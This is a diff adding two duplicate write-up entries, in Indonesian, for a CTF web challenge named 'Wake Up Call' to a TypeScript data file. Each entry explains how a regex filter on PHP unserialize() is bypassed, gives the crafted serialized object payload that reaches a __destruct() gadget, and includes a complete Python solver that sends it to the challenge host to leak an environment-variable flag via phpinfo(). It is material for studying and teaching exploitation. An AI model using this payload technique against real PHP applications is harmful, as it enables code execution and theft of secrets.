@@ -1,6 +1,6 @@
 import type { WriteUp } from '../types';
 
-// Bhackari — 3 writeups
+// Bhackari — 5 writeups
 export const bhackariWriteups: WriteUp[] = [
   {
     "id": "bhackari-rev-dontunpackme",
@@ -133,6 +133,56 @@ export const bhackariWriteups: WriteUp[] = [
     ],
     "terminalOutputs": [],
     "flag": "bhackariCTF{c0m3_0n_n0w_wh0_do35nt_h4t3_r3d1r3ct5?}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "bhackari-web-wakeupcall",
+    "title": "Wake Up Call",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Bhackari",
+    "tags": [],
+    "description": "Challenge ini memberi source PHP langsung dari halaman utama. Bagian pentingnya ada di parameter `ser`:",
+    "problemDescription": "Challenge ini memberi source PHP langsung dari halaman utama. Bagian pentingnya ada di parameter `ser`:\n\n```php\n$serialized = $_GET['ser'];\n\nif (CheckSerializedData($serialized)) {\n  @unserialize($serialized);\n}\n```\n\nFilter `CheckSerializedData()` mencoba menolak token serialisasi berbahaya:\n\n```php\nfunction CheckSerializedData($str) {\n    if (preg_match('/(?:O:|C:|s:|a:)/', preg_replace('/\"[^\"]*\"/', '', $str))) return false;\n    return true;\n}\n```\n\nMasalahnya, filter ini hanya regex sederhana. Ia menghapus isi di antara tanda kutip dulu, lalu mencari token `O:`, `C:`, `s:`, dan `a:`. Karena parsing regex ini tidak memahami format serialized PHP secara utuh, kita bisa membuat tanda kutip yang membuat bagian berbahaya terlihat seperti berada di dalam string bagi regex, tetapi tetap diparse berbeda oleh `unserialize()`.\n\nPayload yang dipakai:\n\n```text\no:1:\"i:0;O:8:\"Bhackaro\":1:{s:6:\"action\";s:7:\"phpinfo\";}}\n```\n\nPenjelasannya:\n\n- `o:1:\"i:0;...` memakai format object lama PHP untuk membuat container `stdClass` dengan satu property.\n- Setelah filter menghapus string bertanda kutip, token `O:` dan `s:` di tengah payload tidak lagi terlihat sebagai token yang dilarang.\n- Saat diproses oleh `unserialize()`, bagian `O:8:\"Bhackaro\"...` tetap dibuat sebagai object `Bhackaro`.\n- Property publik `action` diisi dengan string `phpinfo`.\n- Ketika object `Bhackaro` dihancurkan, method `__destruct()` menjalankan `($this->action)()`, sehingga `phpinfo()` terpanggil.\n\n`phpinfo()` menampilkan environment variable proses Apache/PHP. Karena flag disimpan di environment `FLAG`, flag bisa diekstrak dari output HTML.\n\nCara menjalankan solver:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solver.py\n```\n\nOutput:\n\n```text\nbhackariCTF{c0ngr4tz_f0r_unl0ck1ng_th3_fl4g_st0r3!_f8ea7eb2485c0bbca52d50e7dedf18ff88510bac615b66e309205e6989c01ad2}\n```",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solver.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport html\r\nimport re\r\nimport sys\r\nimport urllib.parse\r\nimport urllib.request\r\n\r\n\r\nDEFAULT_URL = \"http://wakeup.challs.ctf.bhackari.it:1337/\"\r\nFLAG_RE = re.compile(r\"bhackariCTF\\{[^}<\\s]+\\}\")\r\n\r\n\r\ndef fetch(url, payload):\r\n    query = urllib.parse.urlencode({\"ser\": payload})\r\n    target = f\"{url.rstrip('/')}?{query}\"\r\n\r\n    with urllib.request.urlopen(target, timeout=20) as response:\r\n        return response.read().decode(\"utf-8\", errors=\"replace\")\r\n\r\n\r\ndef main():\r\n    url = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_URL\r\n\r\n    payload = 'o:1:\"i:0;O:8:\"Bhackaro\":1:{s:6:\"action\";s:7:\"phpinfo\";}}'\r\n    body = html.unescape(fetch(url, payload))\r\n\r\n    match = FLAG_RE.search(body)\r\n    if not match:\r\n        print(\"Flag tidak ditemukan di response\", file=sys.stderr)\r\n        return 1\r\n\r\n    print(match.group(0))\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "bhackariCTF{c0ngr4tz_f0r_unl0ck1ng_th3_fl4g_st0r3!_f8ea7eb2485c0bbca52d50e7dedf18ff88510bac615b66e309205e6989c01ad2}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "bhackari-web-wakeupcall-wakeupcall",
+    "title": "Wake Up Call",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Bhackari",
+    "tags": [],
+    "description": "Challenge ini memberi source PHP langsung dari halaman utama. Bagian pentingnya ada di parameter `ser`:",
+    "problemDescription": "Challenge ini memberi source PHP langsung dari halaman utama. Bagian pentingnya ada di parameter `ser`:\n\n```php\n$serialized = $_GET['ser'];\n\nif (CheckSerializedData($serialized)) {\n  @unserialize($serialized);\n}\n```\n\nFilter `CheckSerializedData()` mencoba menolak token serialisasi berbahaya:\n\n```php\nfunction CheckSerializedData($str) {\n    if (preg_match('/(?:O:|C:|s:|a:)/', preg_replace('/\"[^\"]*\"/', '', $str))) return false;\n    return true;\n}\n```\n\nMasalahnya, filter ini hanya regex sederhana. Ia menghapus isi di antara tanda kutip dulu, lalu mencari token `O:`, `C:`, `s:`, dan `a:`. Karena parsing regex ini tidak memahami format serialized PHP secara utuh, kita bisa membuat tanda kutip yang membuat bagian berbahaya terlihat seperti berada di dalam string bagi regex, tetapi tetap diparse berbeda oleh `unserialize()`.\n\nPayload yang dipakai:\n\n```text\no:1:\"i:0;O:8:\"Bhackaro\":1:{s:6:\"action\";s:7:\"phpinfo\";}}\n```\n\nPenjelasannya:\n\n- `o:1:\"i:0;...` memakai format object lama PHP untuk membuat container `stdClass` dengan satu property.\n- Setelah filter menghapus string bertanda kutip, token `O:` dan `s:` di tengah payload tidak lagi terlihat sebagai token yang dilarang.\n- Saat diproses oleh `unserialize()`, bagian `O:8:\"Bhackaro\"...` tetap dibuat sebagai object `Bhackaro`.\n- Property publik `action` diisi dengan string `phpinfo`.\n- Ketika object `Bhackaro` dihancurkan, method `__destruct()` menjalankan `($this->action)()`, sehingga `phpinfo()` terpanggil.\n\n`phpinfo()` menampilkan environment variable proses Apache/PHP. Karena flag disimpan di environment `FLAG`, flag bisa diekstrak dari output HTML.\n\nCara menjalankan solver:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solver.py\n```\n\nOutput:\n\n```text\nbhackariCTF{c0ngr4tz_f0r_unl0ck1ng_th3_fl4g_st0r3!_f8ea7eb2485c0bbca52d50e7dedf18ff88510bac615b66e309205e6989c01ad2}\n```",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solver.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nimport html\r\nimport re\r\nimport sys\r\nimport urllib.parse\r\nimport urllib.request\r\n\r\n\r\nDEFAULT_URL = \"http://wakeup.challs.ctf.bhackari.it:1337/\"\r\nFLAG_RE = re.compile(r\"bhackariCTF\\{[^}<\\s]+\\}\")\r\n\r\n\r\ndef fetch(url, payload):\r\n    query = urllib.parse.urlencode({\"ser\": payload})\r\n    target = f\"{url.rstrip('/')}?{query}\"\r\n\r\n    with urllib.request.urlopen(target, timeout=20) as response:\r\n        return response.read().decode(\"utf-8\", errors=\"replace\")\r\n\r\n\r\ndef main():\r\n    url = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_URL\r\n\r\n    payload = 'o:1:\"i:0;O:8:\"Bhackaro\":1:{s:6:\"action\";s:7:\"phpinfo\";}}'\r\n    body = html.unescape(fetch(url, payload))\r\n\r\n    match = FLAG_RE.search(body)\r\n    if not match:\r\n        print(\"Flag tidak ditemukan di response\", file=sys.stderr)\r\n        return 1\r\n\r\n    print(match.group(0))\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "bhackariCTF{c0ngr4tz_f0r_unl0ck1ng_th3_fl4g_st0r3!_f8ea7eb2485c0bbca52d50e7dedf18ff88510bac615b66e309205e6989c01ad2}",
     "lessonsLearned": ""
   }
 ];
